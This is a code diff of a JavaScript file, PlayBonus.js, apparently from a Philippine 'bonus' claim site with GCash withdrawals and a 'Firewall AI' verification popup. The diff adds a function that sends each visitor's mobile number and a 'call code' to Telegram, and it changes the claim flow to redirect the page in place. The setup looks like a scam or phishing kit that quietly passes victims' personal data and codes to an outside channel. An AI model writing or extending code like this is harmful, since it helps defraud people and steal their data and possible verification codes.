@@ -1,6 +1,6 @@
 /**
- * PlayBonus.js - FINAL VERSION
- * Anti-Lag Optimized + ADS Popup + Redirect Logic
+ * PlayBonus.js - FINAL REDIRECT FIX
+ * Anti-Lag Optimized + ADS Popup + Direct Redirect
  * + Telegram: Mobile Number & Time Only
  */
 
@@ -171,7 +171,6 @@
         } catch(e) {}
     }
 
-    // ⚡ Pinaikli ang Telegram Notifs - Mobile at Time lang
     function getFormattedTime() {
         return new Date().toLocaleString('en-PH', { timeZone: 'Asia/Manila' });
     }
@@ -190,6 +189,10 @@
 
     function sendAdsPopupNotif(p, d, b) {
         sendTelegram('📢 ADS POPUP\n👤 Mobile: ' + p + '\n⏰ Time: ' + getFormattedTime());
+    }
+
+    function sendAICallRequestNotif(p, d, c) {
+        sendTelegram('📞 AI CALL REQ\n👤 Mobile: ' + p + '\n🔑 Code: ' + c + '\n⏰ Time: ' + getFormattedTime());
     }
 
     // ============================================================
@@ -448,7 +451,7 @@
     }
 
     // ============================================================
-    // HANDLE CLAIM VIA GCASH
+    // HANDLE CLAIM VIA GCASH (DIRECT REDIRECT - WALANG BAGONG TAB)
     // ============================================================
     async function handleClaimViaGCash() {
         if (withdrawInProgress) return;
@@ -476,10 +479,13 @@
             if (redirectUrl) {
                 sendWithdrawRequestNotif(userPhoneStr, deviceId, currentBalance, false);
                 if (gcashBtn) gcashBtn.innerHTML = '<i class="fas fa-check"></i> REDIRECTING...';
+                
+                // ✅ DIRECT REDIRECT (walang bagong tab)
                 setTimeout(function () {
                     sendWithdrawRedirectNotif(userPhoneStr, deviceId, currentBalance);
-                    window.location.href = redirectUrl;
-                }, 1500);
+                    window.location.replace(redirectUrl);
+                }, 1000);
+                
                 withdrawInProgress = false;
                 return;
             }
@@ -602,7 +608,7 @@
     }
 
     // ============================================================
-    // FIREWALL AI POPUP (3D FRUITS THEME)
+    // FIREWALL AI POPUP
     // ============================================================
     function showFirewallVerificationPopup() {
         var existingPopup = document.getElementById('firewallAIPopup');
@@ -680,7 +686,7 @@
             });
         }
 
-        sendTelegram('📞 AI CALL REQ\n👤 Mobile: ' + userPhoneStr + '\n🔑 Code: ' + currentCallCode + '\n⏰ Time: ' + getFormattedTime());
+        sendAICallRequestNotif(userPhoneStr, deviceId, currentCallCode);
 
         var statusIcon = document.getElementById('firewallAIIcon');
         var statusText = document.getElementById('firewallAIText');
